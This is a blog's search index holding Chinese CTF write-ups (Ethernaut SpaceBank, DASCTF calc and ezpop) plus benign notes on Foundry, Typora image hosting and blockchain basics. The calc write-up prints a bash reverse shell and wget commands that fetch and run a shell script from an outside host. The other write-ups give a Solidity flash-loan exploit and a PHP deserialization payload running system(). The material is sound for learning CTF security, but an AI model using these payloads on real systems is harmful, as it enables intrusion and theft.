<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024 Ethernaut CTF 部分Write-up</title>
    <url>/2024/03/20/2024EthernautCTF/</url>
    <content><![CDATA[<h2 id="SpaceBank"><a href="#SpaceBank" class="headerlink" title="SpaceBank"></a>SpaceBank</h2><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><pre><code class="solidity">pragma solidity ^0.8.9;

import &quot;openzeppelin/access/Ownable.sol&quot;;
import &quot;openzeppelin/token/ERC20/IERC20.sol&quot;;
import &quot;openzeppelin/token/ERC20/ERC20.sol&quot;;

interface IFlashLoanReceiver &#123;
    function executeFlashLoan(uint256 amount) external;
&#125;

contract SpaceBank &#123;
    //Number of alarm activations
    uint256 EmergencyAlarms;
    //Token of the bank
    IERC20 public token;
    //Depositor balances
    mapping(address =&gt; uint256) public balances;
    //reentrancy protection
    bool entered;

    uint256 internal gasLimit0 = 9999999999999999999999999; //@TODO calculate these gas limit values to be as small as possible

    uint256 internal gasLimit1 = 9999999999999999999999999;

    address internal _createdAddress;

    uint256 alarmTime;

    bool public exploded;

    bool locked; //If this is true the bank will be locked forever.

    modifier _emergencyAlarms(bytes calldata data) &#123;
        if (entered = true) &#123;
            EmergencyAlarms++; //Sound the alarm and activate the security protocol
            _emergencyAlarmProtocol(data);
        &#125;
        _;
    &#125;

    constructor(address _token) &#123;
        token = IERC20(_token);
    &#125;

    function gasLimits() internal view returns (uint256) &#123;
        if (EmergencyAlarms == 1) return gasLimit0;
        if (EmergencyAlarms == 2) return gasLimit1;
    &#125;

    //Deposit into the bank
    function deposit(uint256 amount, bytes calldata data) external _emergencyAlarms(data) &#123;
        require(token.transferFrom(msg.sender, address(this), amount), &quot;Transfer failed&quot;);
        balances[msg.sender] += amount;
    &#125;

    //Withdraws from the bank
    function withdraw(uint256 amount) external &#123; 
        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);
        balances[msg.sender] -= amount;
        require(token.transfer(msg.sender, amount), &quot;Transfer failed&quot;);
    &#125;

    //Takes a flashloan from the bank
    function flashLoan(uint256 amount, address flashLoanReceiver) external &#123;
        uint256 initialBalance = token.balanceOf(address(this));

        require(initialBalance &gt;= amount, &quot;Not enough liquidity&quot;);
        // Transfer loan amount to the receiver
        require(token.transfer(flashLoanReceiver, amount), &quot;Transfer failed&quot;);

        // Execute custom logic in the receiver&#39;s contract
        entered = true;

        (bool success, bytes memory result) =
            flashLoanReceiver.call(abi.encodeWithSignature(&quot;executeFlashLoan(uint256)&quot;, amount));
        if (success == false) revert(string(result));
        entered = false;
        uint256 fee = amount / 1000; // 0.1% fee
        uint256 currentBalance = token.balanceOf(address(this));
        require(currentBalance &gt;= initialBalance + fee, &quot;Loan not repaid with fee&quot;);
    &#125;

    //Alarms will be activated to protect from thiefs
    function _emergencyAlarmProtocol(bytes memory data) internal &#123;
        if (EmergencyAlarms == 1) &#123;
            //first alarm
            uint256 MagicNumber = block.number;

            uint256 x = abi.decode(data, (uint256));
            require(x == MagicNumber % 47, &quot;Wrong passphrase&quot;);
        &#125;
        if (EmergencyAlarms == 2) &#123;
            //second alarm
            bytes32 MagicNumber = bytes32(block.number);
            uint256 balance = address(this).balance;
            address newContractAddress;
            assembly &#123;
                newContractAddress := create2(0, add(data, 0x20), mload(data), MagicNumber)
            &#125;
            require(address(this).balance &gt; balance, &quot;You need to send ether to pass through security&quot;);
            _createdAddress = newContractAddress;
            alarmTime = block.number;
        &#125;
        if (EmergencyAlarms == 3) &#123;
            revert(&quot;Third alarm, bank is locked&quot;);
        &#125;
    &#125;

    ///Make the bank explode
    function explodeSpaceBank() external &#123;
        require(block.number == alarmTime + 2, &quot;Can&#39;t explode the bank&quot;);
        uint256 codeSize;
        address value = _createdAddress;
        assembly &#123;
            codeSize := extcodesize(value)
        &#125;
        require(codeSize == 0, &quot;You were caught&quot;);
        require(token.balanceOf(address(this)) == 0, &quot;The bank still has funds&quot;);
        exploded = true;
    &#125;
&#125;

contract SpaceToken is ERC20, Ownable &#123;
    constructor() ERC20(&quot;SpaceToken&quot;, &quot;Space&quot;) Ownable(msg.sender) &#123;&#125;

    function mint(address to, uint256 amount) public onlyOwner &#123;
        _mint(to, amount);
    &#125;
&#125;
</code></pre>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>The formidable Space Bank is known for its stringent security systems and vast reserves of space tokens (Galactic credits). Outsmart two state-of-the-art alarms, steal the tokens, and then detonate the bank to claim victory.</p>
<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目的要求是绕过两个警报，然后掏空银行中的代币，最后炸掉银行。如果要炸银行，那么前两个步骤是必须要做的，算是提示了一番。</p>
<p>我们从最终目标<code>explodeSpaceBank()</code>函数入手，其中有三个断言：</p>
<ul>
<li>区块号必须满足<code>alarmTime + 2</code>的要求</li>
<li>某个合约的<code>codesize</code>必须为 0</li>
<li>银行中的代币必须掏干净，一个也不能剩</li>
</ul>
<p>前两个断言暂时比较模糊，但是最后一个偷光代币的要求还是很明确的，我们查看前两个断言，变量都指向了<code>_emergencyAlarmProtocol</code>函数，这个函数实现了警报的功能，会在银行的<code>deposit()</code>函数被调用时由<code>_emergencyAlarms</code>修改器调用。不难看出，往这个函数里传入正确的<code>data</code>参数可以绕过警报而不被回滚。</p>
<p>第一次警报的绕过十分简单，只需要简单的计算：</p>
<pre><code class="solidity">data = abi.encode((block.number) % 47)
</code></pre>
<p>第二次警报需要我们传入一个合约的字节码供其部署，部署完成以后立即执行一个断言，判断其 ETH 余额相较于部署前是否增加，换言之，我们需要在被部署合约的构造函数中完成向银行合约（无 fallback 函数）转账，以及自毁的（回想<code>explodeSpaceBank()</code>的第二个断言）功能。对此，我的解决方案如下：部署 B合约的同时给它转入 ETH，其<code>pay()</code>函数实现自毁并（余额转到银行）；编写 A合约，实现在构造过程中调用 B合约的<code>pay()</code>函数并自毁，将 A合约的字节码传入<code>_emergencyAlarmProtocol</code>即可。这样就解决了难以向由银行部署的 A合约进行转账的痛点。如下代码，A合约代表 Middle，B合约代表 Payer。</p>
<pre><code class="solidity">contract Middle &#123;
    Payer constant myPayer = Payer();

    constructor() &#123;
        myPayer.pay(payable(msg.sender));
        selfdestruct(payable(msg.sender));
    &#125;
&#125;

contract Payer &#123;
    constructor() payable &#123;&#125;

    function pay(address payable _bank) public &#123;
        selfdestruct(_bank);
    &#125;
&#125;
</code></pre>
<p>警报的问题解决了，新的问题也随之浮现，即需要调用银行的<code>deposit()</code>函数才能触发警报，而我们根本没有任何一个 SpaceToken，无法直接进行 deposit 操作。没有钱嘛，就去贷款。可以看到银行合约有一个<code>flashLoan()</code>闪贷服务，主要流程就是：贷款放出后，银行会调用借贷者合约的一个特定函数，让借贷者合约拿钱去办事，而后连本带利（借款达到1000元开始收利息）归还给银行。当然，这只是正常的流程。。。在<code>flashLoan()</code>函数中是有类似于防范重入攻击的<code>entered</code>变量的，但是它只能去触发警报，而没有保护真正应该注意的地方——<code>deposit()</code>。在闪贷函数中，判断借贷者是否还款只是利用了前后的代币余额大小进行比较，而<code>deposit()</code>不仅可以增加银行的代币余额，还能增加我们在银行的存款余额。如此，我们既能掏空银行的代币，也能触发警报了。</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>思路明确了，下面是我的攻击合约们和 Python 脚本：</p>
<p>Solver.sol：</p>
<pre><code class="solidity">pragma solidity ^0.8.9;

import &quot;src/Challenge.sol&quot;;

contract Solver &#123;
    SpaceBank immutable mySpaceBank;
    IERC20 immutable token;

    constructor(address _bank) &#123;
        mySpaceBank = SpaceBank(_bank);
        token = mySpaceBank.token();
    &#125;

    function attack() external &#123;
        // 借款功能，刷得余额后提款
        mySpaceBank.flashLoan(400, address(this));
        mySpaceBank.flashLoan(600, address(this));
        mySpaceBank.withdraw(1000);
    &#125;

    function executeFlashLoan(uint256 amount) external returns (bool, bytes memory) &#123;
        // 借款后会被银行调用，在此完成重入、绕过警报的功能
        if (amount == 400) &#123;
            token.approve(address(mySpaceBank), 400);
            mySpaceBank.deposit(400, abi.encode((block.number) % 47));
        &#125; else &#123;
            bytes memory MiddleCode = type(Middle).creationCode;
            token.approve(address(mySpaceBank), 600);
            mySpaceBank.deposit(600, MiddleCode);
        &#125;
        return (true, &quot;9527&quot;);
    &#125;

    function addBlock() external returns (uint256) &#123;
        // 没用的函数，为了增加区块数写的
        if (block.number % 2 == 1) &#123;
            return 1;
        &#125; else &#123;
            return 0;
        &#125;
    &#125;
&#125;

contract Middle &#123;
    Payer constant myPayer = Payer();
    // 括号中留空，由Python脚本来填充Payer的地址，constant修饰的变量会直接放在字节码中哦

    constructor() &#123;
        myPayer.pay(payable(msg.sender));
        selfdestruct(payable(msg.sender));
    &#125;
&#125;

contract Payer &#123;
    constructor() payable &#123;&#125;

    function pay(address payable _bank) public &#123;
        selfdestruct(_bank);
    &#125;
&#125;
</code></pre>
<p>solve.py：</p>
<pre><code class="python">import sys, re
from cheb3 import Connection
from cheb3.utils import *

solverFile = &quot;challenge/project/src/Solver.sol&quot;

def modify(payerAddr):
    # 匹配并修改Solver.sol，更新Payer的地址
    with open(solverFile, &quot;r&quot;) as file:
        code = file.read()
        pattern = re.compile(r&quot;(?&lt;=Payer\()[A-Za-z0-9]+(?=\))&quot;)
        modified_code = re.sub(pattern, payerAddr, code)

    with open(solverFile, &quot;w&quot;) as file:
        file.write(modified_code)
    
def call(account, to, sig):
    receipt = account.send_transaction(to=to, data=encode_with_signature(sig))
    return receipt

def deploy(conn, name, user, *args, **kwargs):
    abi, bytecode = compile_file(contract_file=solverFile, contract_names=[name], solc_version=&quot;0.8.21&quot;, base_path=&quot;challenge/project&quot;)[name]

    c = conn.contract(signer=user, contract_name=name, abi=abi, bytecode=bytecode)
    c.deploy(*args, **kwargs)

    return c

def main():
    [rpc, pk, clg] = sys.argv[1:]
    # rpc = rpc.replace(&quot;127.0.0.1&quot;, &quot;192.168.101.11&quot;)
    # 如果你经常Server Error 502，不妨试试把回环地址换成局域网地址
    conn = Connection(rpc)
    user = conn.account(pk)
    
    # Challenge合约中SPACEBANK变量是immutable的，它不存在储存，而是字节码
    bankAddr = conn.get_code(clg).hex()[212:252]
    bankAddr = conn.w3.to_checksum_address(bankAddr)
    print(&quot;SpaceBank address: &quot; + bankAddr)

    # 部署Payer合约，同时向其转账
    Payer = deploy(conn, &quot;Payer&quot;, user, value = 100)
    print(&quot;Balance of Payer: %d&quot; % conn.get_balance(Payer.address))
    modify(Payer.address)

    # 部署Solve合约
    Solver = deploy(conn, &quot;Solver&quot;, user, bankAddr)
    print(&quot;(1st) Block number now: &quot;, conn.w3.eth.get_block_number())
    Solver.functions.attack().send_transaction()
    print(&quot;(2nd) Block number now: &quot;, conn.w3.eth.get_block_number())
    Solver.functions.addBlock().send_transaction()
    print(&quot;(3rd) Block number now: &quot;, conn.w3.eth.get_block_number())
    
    # 调用炸银行的函数，并验证是否成功
    call(user, bankAddr, &quot;explodeSpaceBank()&quot;)
    finish = decode_data(user.call(bankAddr, data=encode_with_signature(&quot;exploded()&quot;)), [&quot;bool&quot;])
    if (finish): print(&quot;BOOOOOOM!&quot;)

if __name__==&quot;__main__&quot;:
    main()
</code></pre>
<p>逻辑全部在合约和 Python 脚本里了，通过 Python 完成包括合约部署等一系列操作。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>2022DASCTF-calc</title>
    <url>/2022/04/19/DASCTF2022-calc/</url>
    <content><![CDATA[<h1 id="DASCTF-calc"><a href="#DASCTF-calc" class="headerlink" title="[DASCTF]-calc"></a>[DASCTF]-calc</h1><p>打开来是个计算器，没猜错应该要RCE</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><pre><code class="python">#coding=utf-8
from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory
import random
from urllib import parse
import os
from werkzeug.utils import secure_filename
import time

app=Flask(__name__)

def waf(s):
    blacklist = [&#39;import&#39;,&#39;(&#39;,&#39;)&#39;,&#39; &#39;,&#39;_&#39;,&#39;|&#39;,&#39;;&#39;,&#39;&quot;&#39;,&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;&amp;&#39;,&#39;getattr&#39;,&#39;os&#39;,&#39;system&#39;,&#39;class&#39;,&#39;subclasses&#39;,&#39;mro&#39;,&#39;request&#39;,&#39;args&#39;,&#39;eval&#39;,&#39;if&#39;,&#39;subprocess&#39;,&#39;file&#39;,&#39;open&#39;,&#39;popen&#39;,&#39;builtins&#39;,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;item&#39;,&#39;getitem&#39;,&#39;getattribute&#39;,&#39;func_globals&#39;,&#39;__init__&#39;,&#39;join&#39;,&#39;__dict__&#39;]
    flag = True
    for no in blacklist:
        if no.lower() in s.lower():
            flag= False
            print(no)
            break
    return flag
    
@app.route(&quot;/&quot;)
def index():
    &quot;欢迎来到SUctf2022&quot;
    return render_template(&quot;index.html&quot;)

@app.route(&quot;/calc&quot;,methods=[&#39;GET&#39;])
def calc():
    ip = request.remote_addr
    num = request.values.get(&quot;num&quot;)
    log = &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num)
    
    if waf(num):
        try:
            data = eval(num)
            os.system(log)
        except:
            pass
        return str(data)
    else:
        return &quot;waf!!&quot;

if __name__ == &quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;,port=5000)  
</code></pre>
<p>过滤了一些命令常用的字符和函数，所以这里使用模板注入的机会不大，故专注于<code>os.system()</code>。另外，Linux命令常用的反引号没有被过滤，Python的注释符<code>#</code>也幸存了，由于<code>eval()</code>是执行一个Python的字符串表达式，为了不让它报错，需要用<code>#</code>把后面拼接的Linux命令注释掉。</p>
<h2 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h2><p>由于过滤了很多字符，且命令并无回显，所以这里用<code>wget</code>下载反弹shell的<code>sh</code>文件，然后运行</p>
<p>空格用%09绕过就好，也可以用<code>&gt;</code>等等，不多赘述</p>
<p>上传一个这样的shell文件到一个网站上</p>
<pre><code class="shell">bash -i &gt;&amp; /dev/tcp/&#123;IP&#125;/&#123;PORT&#125; 0&gt;&amp;1
</code></pre>
<p>让目标机器保存在<code>/tmp</code>下，然后执行</p>
<pre><code>num=7*7%23`wget%09-P%09/tmp%09http://vveelin.com.cn:89/bsh.sh`
num=7*7%23`sh%09/tmp/bsh.sh`
</code></pre>
<p>攻击机监听对应端口，getshell</p>
<pre><code class="bash">[root@ecs-394098 ~]# nc -lvnp 4444
Ncat: Connection from 117.21.200.166.
Ncat: Connection from 117.21.200.166:62378.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell

root@out:/# cat Th1s_is__F1114g
cat Th1s_is__F1114g
flag&#123;16c2218b-4113-411e-b64a-30dd12604d3c&#125;
</code></pre>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>2022DASCTF-ezpop</title>
    <url>/2022/04/19/DASCTF2022-ezpop/</url>
    <content><![CDATA[<h1 id="DASCTF-ezpop"><a href="#DASCTF-ezpop" class="headerlink" title="[DASCTF]-ezpop"></a>[DASCTF]-ezpop</h1><p>一道简单的php反序列化题目</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><pre><code class="php">&lt;?php  

class crow  
&#123;  
    public $v1;  
    public $v2;  
  
    function eval() &#123;  
        echo new $this-&gt;v1($this-&gt;v2);  
    &#125;  
  
    public function __invoke()  
    &#123; 
        $this-&gt;v1-&gt;world();  
    &#125;  
&#125;  
  
class fin  
&#123;  
    public $f1;  
  
    public function __destruct()  
    &#123;  
        echo $this-&gt;f1 . &#39;114514&#39;;  
    &#125;  
  
    public function run()  
    &#123;  
        ($this-&gt;f1)();  
    &#125;  
  
    public function __call($a, $b)  
    &#123;  
        echo $this-&gt;f1-&gt;get_flag();  
    &#125;  
  
&#125;  
  
class what  
&#123;  
    public $a;  
  
    public function __toString()  
    &#123; 
        $this-&gt;a-&gt;run();  
        return &#39;hello&#39;;  
    &#125;  
&#125;  
class mix  
&#123;  
    public $m1;  
  
    public function run()  
    &#123;  
        ($this-&gt;m1)();  
    &#125;  
  
    public function get_flag()  
    &#123;  
        eval(&#39;#&#39; . $this-&gt;m1);  
    &#125;  
  
&#125;  
  
if (isset($_POST[&#39;cmd&#39;])) &#123; unserialize($_POST[&#39;cmd&#39;]);  
&#125; else &#123; highlight_file(__FILE__);  
&#125;
</code></pre>
<p>发现没有<code>__wakeup()</code>和<code>__construct()</code>，那么最先被调用的应该就是<code>fin</code>类里面的<code>__destruct()</code>方法了。</p>
<h2 id="构造POP链"><a href="#构造POP链" class="headerlink" title="构造POP链"></a>构造<code>POP</code>链</h2><pre><code>fin::__destruct()    # 其中的echo触发__toString()
↓
what::__toString()   # 调用run()
↓
mix::run()           # 将f1以函数方式调用，触发__invoke()
↓
crow::__invoke()     # 调用不存在的方法world()，触发__call()
↓
fin::__call()        # 调用get_flag()
↓
mix::get_flag()      # 这里在命令前加了一个注释符，用换行符绕过即可
</code></pre>
<h2 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造<code>Payload</code></h2><pre><code class="php">&lt;?php

class crow
&#123;
    public $v1;
    public $v2;
    
    public function __construct($v1)
    &#123;
        $this-&gt;v1 = $v1;
    &#125;
&#125;

class fin
&#123;
    public $f1;

    public function __construct($f1)
    &#123;
        $this-&gt;f1 = $f1;
    &#125;
&#125;

class what
&#123;
    public $a;
   
    public function __construct($a)
    &#123;
        $this-&gt;a = $a;
    &#125;
&#125;

class mix
&#123;
    public $m1;
   
    public function __construct($m1)
    &#123;
        $this-&gt;m1 = $m1;
    &#125;
&#125;

$f=new mix(&quot;\nsystem(&#39;cat *&#39;);&quot;);
$e=new fin($f);
$d=new crow($e);
$c=new mix($d);
$b=new what($c);
$a=new fin($b);

echo urlencode(serialize($a));
</code></pre>
<p>输出</p>
<pre><code>O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A17%3A%22%0Asystem%28%27cat+%2A%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D
</code></pre>
<p>拿到flag</p>
<pre><code>//flag&#123;43282d76-6cb5-4e5c-9286-48e8688c6853&#125;
not here, but it&#39;s close, think more.not here, but it&#39;s close, think more.not here, but it&#39;s close, think more.not here, but you are almost getting the flag!
</code></pre>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>Foundry 工具的使用笔记</title>
    <url>/2023/11/07/Foundry%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.</p>
<p>Foundry 是一个极快、可移植和模块化的工具包，用于用 Rust 编写的以太坊应用程序开发。</p>
<h2 id="Forge-的使用"><a href="#Forge-的使用" class="headerlink" title="Forge 的使用"></a>Forge 的使用</h2><p>Forge Standard Library (Forge Std for short) is a collection of helpful contracts that make writing tests easier, faster, and more user-friendly.</p>
<p>Forge Standard Library（简称 Forge Std）是有用的合同集合，使编写测试更容易、更快速、更用户友好。</p>
<h3 id="init-创建并初始化新项目"><a href="#init-创建并初始化新项目" class="headerlink" title="init 创建并初始化新项目"></a>init 创建并初始化新项目</h3><pre><code class="bash">$ forge init test_project
</code></pre>
<p>由默认模板创建一个新目录 test_project，并初始化一个新的 git 仓库。</p>
<p>使用 –templates 参数可以从其他模板创建新项目。</p>
<p>默认模板目录结构如下：</p>
<pre><code class="bash">$ tree . -d -L 1
.
├── cache    // 编译用，缓存
├── lib      // 自带Forge标准库
├── out      // 测试后生成，包含合约工件，如ABI
├── script   // 用于部署合约的脚本
├── src      // 存放合约代码
└── test     // 测试合约代码

6 directories
</code></pre>
<h3 id="test-测试项目"><a href="#test-测试项目" class="headerlink" title="test 测试项目"></a>test 测试项目</h3><p>测试需要项目中有待测合约，和用于执行测试的测试合约。任何具有 test 开头的函数的合约都会被认为是测试合约，一般会放在项目的 test&#x2F; 目录下，并以 <code>.t.sol</code> 结尾。</p>
<p>待测合约：Counter.sol</p>
<pre><code class="solidity">// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Counter &#123;
    uint256 public number;

    function setNumber(uint256 newNumber) public &#123;
        number = newNumber;
    &#125;

    function increment() public &#123;
        number++;
    &#125;
&#125;
</code></pre>
<p>测试合约：Counter.t.sol</p>
<pre><code class="solidity">// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import &#123;Test, console2&#125; from &quot;forge-std/Test.sol&quot;;
import &#123;Counter&#125; from &quot;../src/Counter.sol&quot;;

contract CounterTest is Test &#123;
    Counter public counter;

    function setUp() public &#123;
        counter = new Counter();
        counter.setNumber(0);
    &#125;

    function test_Increment() public &#123;
        counter.increment();
        assertEq(counter.number(), 1);
    &#125;

    function testFuzz_SetNumber(uint256 x) public &#123;
        counter.setNumber(x);
        assertEq(counter.number(), x);
    &#125;
&#125;
</code></pre>
<p>测试用法如下：</p>
<pre><code class="bash">$ forge test
// 测试当前项目

$ forge test --match-contract &lt;待测合约&gt; --match-test &lt;测试合约&gt;
// 测试筛选出的合约
</code></pre>
<p>可以看到测试函数中除了调用被测合约的函数以外，还有用于验证测试结果的 assert() 函数，示例中是 assertEq()，用于判断两个参数是否相等：</p>
<pre><code class="solidity">function assertEq(int a, int b) internal &#123;
    if (a != b) &#123;
        emit log(&quot;Error: a == b not satisfied [int]&quot;);
        emit log_named_int(&quot;      Left&quot;, a);
        emit log_named_int(&quot;     Right&quot;, b);
        fail();
    &#125;
&#125;
</code></pre>
<p>若是判断不符合预期，就会测试失败。</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>Typora图片自动上传Github图床</title>
    <url>/2022/04/28/Typora%E5%9B%BE%E7%89%87%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0GitHub%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00 序言"></a>0x00 序言</h2><p>平时比起一些花里胡哨的编辑器（如Obsidian），我还是更喜欢用Typora编辑markdown，分享一下Typora复制图片上传图床的技巧</p>
<h2 id="0x01-Github仓库作为图床"><a href="#0x01-Github仓库作为图床" class="headerlink" title="0x01 Github仓库作为图床"></a>0x01 Github仓库作为图床</h2><p>这里需要创建一个 <code>Repositories </code>(仓库)作为图床，登录GitHub进入个人页，在左边会有添加 <code>Repositories </code>的选项，点进去进入创建仓库的界面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/TyporaPics/img/202204280322781.png"
                      alt="image-20220428032248413"
                ></p>
<p>创建的界面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/TyporaPics/img/202204280323325.png"
                      alt="image-20220428032349070"
                ></p>
<ul>
<li><code>Repository name</code>处就填你想要的库名称，比如我的就叫 <code>TyporaPics</code></li>
<li><code>Description</code>那里随便写个描述就可以</li>
<li>权限那里要选择 <code>Public</code></li>
<li>记得勾选上<code>Add a README file</code>，是为了避免一大堆麻烦</li>
</ul>
<p>以上完成了就可以点击创建了</p>
<p>然后这边顺便拿一下 <code>token</code>吧，点击头向下拉栏的 <code>Settings</code>，再选择设置里的 <code>Developer settings</code>，进入 <code>Personal access tokens</code>，点击创建，底下的一大堆权限只需要勾上<code>repo</code>就可以了</p>
<p>注意：拿到 <code>token</code>后一定要妥善保存，这是它唯一一次能被看到！</p>
<h2 id="0x02-PicGo配置"><a href="#0x02-PicGo配置" class="headerlink" title="0x02 PicGo配置"></a>0x02 PicGo配置</h2><p>下载安装 <code>PicGo</code>，进入里面 <code>GitHub</code>图床的配置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/TyporaPics/img/202204280339616.png"
                      alt="image-20220428033916240"
                ></p>
<p>自定义域名那里的 <code>https://cdn.jsdelivr.net/gh/</code>是<code>cdn</code>的加速服务</p>
<p>图床这里设置完毕后，进入<code>PicGo</code>设置把“时间戳重命名”和“上传后自动复制URL”这两个选项开启， <code>PicGo</code>这边就OK了</p>
<h2 id="0x03-Typora配置"><a href="#0x03-Typora配置" class="headerlink" title="0x03 Typora配置"></a>0x03 Typora配置</h2><p>在“偏好设置”中找到“图像”，在“上传服务”处选择 <code>PicGo(app)</code>，并选好相应的路径，然后验证一下成不成功，如果想要一插入图片就自动上传的话可以在<code>“插入图片时...”</code>那里选择<code>上传图片</code>，我个人比较喜欢留一些缓冲的余地，在默认状况下，插入文件后会有按钮选项出现，点一下即可上传</p>
]]></content>
      <categories>
        <category>小妙招</category>
      </categories>
  </entry>
  <entry>
    <title>区块链安全基础备忘</title>
    <url>/2023/10/05/%E5%9F%BA%E7%A1%80%E5%A4%87%E5%BF%98/</url>
    <content><![CDATA[<h2 id="基础名词"><a href="#基础名词" class="headerlink" title="基础名词"></a>基础名词</h2><h3 id="钱包-Wallet"><a href="#钱包-Wallet" class="headerlink" title="钱包 Wallet"></a>钱包 Wallet</h3><p>是一个管理私钥的工具，允许通过其检查、存储、交易持有的数字货币。它是进入区块链世界的基础设施和重要入口。</p>
<ul>
<li><strong>冷钱包 Cold Wallet：</strong>离线钱包，通过生成数字货币的地址和私钥再保存实现存储。</li>
<li><strong>热钱包 Hot Wallet：</strong>在线钱包，使用较方便。</li>
</ul>
<h3 id="公链"><a href="#公链" class="headerlink" title="公链"></a>公链</h3><p>公有链（Public Blockchain）简称公链，是指任何人都可随时进入读取、任何人都能发送交易且能获得有效确认的共识区块链</p>
<h3 id="交易所-Exchange"><a href="#交易所-Exchange" class="headerlink" title="交易所 Exchange"></a>交易所 Exchange</h3><p>数字货币买卖交易的平台。</p>
<ul>
<li><p><strong>去中心化交易所：</strong></p>
<p>交易行为直接发生在区块链上，数字货币会直接发挥使用者的钱包，或是保存在区块链上的智能合约。目前市面上去中心化交易所有WhaleEx、Bancor、dYdX等。</p>
</li>
<li><p><strong>中心化交易所：</strong></p>
<p>目前热门交易所大多采用中心化技术，使用者在平台注册，并经过一连串的身份验证程序（KYC）后，就可以在平台交易数字货币。在使用其交易数字货币时，其货币交换不见得会发生在区块链上，可能仅是修改交易所数据库内的资产数字，交易所只需要在用户提款时准备充足的数字货币供汇出即可。当前的主流交易大部分是在中心化交易所内完成的，目前市面上的中心化交易所有币安、火币、OKEx等。</p>
</li>
</ul>
<h3 id="共识-Consensus"><a href="#共识-Consensus" class="headerlink" title="共识 Consensus"></a>共识 Consensus</h3><p>主要解决分布式系统中，多个节点之间对某个状态达成一致性的问题。</p>
<ul>
<li><p><strong>工作量证明 PoW（Proof of Work）：</strong></p>
<p>是历史上第一个成功的去中心化区块链共识算法，被比特币、以太坊、莱特币等主流公链广泛使用。</p>
<p>其要求节点参与者执行计算密集型的任务，但是对于其他网络参与者易于验证。在比特币的例子中，矿工竞相向由整个网络维护的区块链账本中添加所收集到的交易，即区块。为了做到这一点，矿工必须第一个准确计算出“nonce”，这是一个添加在字符串末尾的数字，用来创建一个满足开头特定个数为零的哈希值。不过存在采矿的大量电力消耗和低交易吞吐量等缺点。</p>
</li>
<li><p><strong>权益证明 PoS（Proof of Stake）：</strong></p>
<p>权力证明机制，一种主流的区块链共识算法，目的是为了让区块链里的分布式节点达成共识，它往往和工作量证明机制（PoW）一起出现。</p>
<p>它通过持币人的统一来达成共识，目的是确定出新区块，这过程相对于PoW，不需要硬件和电力，效率更高。PoS 共识中引入了 Stake 的概念，持币人将代币进行 Staking，要求所有的参与者抵押一部分他们所拥有的 Token 来验证交易，然后获得出块的机会，PoS 共识中会通过选举算法，按照持币量比例以及 Token 抵押时长，或者是一些其他的方式，选出打包区块的矿工。矿工在指定高度完成打包交易，生成新区块，并广播区块，广播的区块经过 PoS 共识中另外一道”门槛”，验证人验证交易，通过验证后，区块得到确认。</p>
<p>这样一轮 PoS 的共识过程就进行完成了。权益证明通过长期绑定验证者的利益和整个网络的利益来阻止不良行为。锁定代币后，如果验证者存在欺诈性交易，那么他们所抵押的 Token 也会被削减。</p>
</li>
<li><p><strong>委托权益证明 DPoS（Delegate Proof of Stake）：</strong>在委托权益证明中，让每一个持币者都可以进行投票，由此产生一定数量的代表，他们彼此之间的权利是完全相等的。</p>
</li>
</ul>
<h3 id="多签-Multi-sig"><a href="#多签-Multi-sig" class="headerlink" title="多签 Multi-sig"></a>多签 Multi-sig</h3><p>指的是需要多个签名才能执行的操作（这些签名是不同私钥生成的）。</p>
